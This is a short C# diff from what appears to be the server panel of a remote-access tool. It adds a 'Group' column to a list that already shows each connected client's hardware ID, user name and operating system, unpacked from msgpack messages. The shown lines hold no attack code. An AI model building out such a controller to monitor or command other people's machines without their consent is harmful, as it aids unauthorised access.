@@ -56,6 +56,7 @@ namespace Server.Handle_Packet
                     client.LV.SubItems.Add("??");
                 }
 
+                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
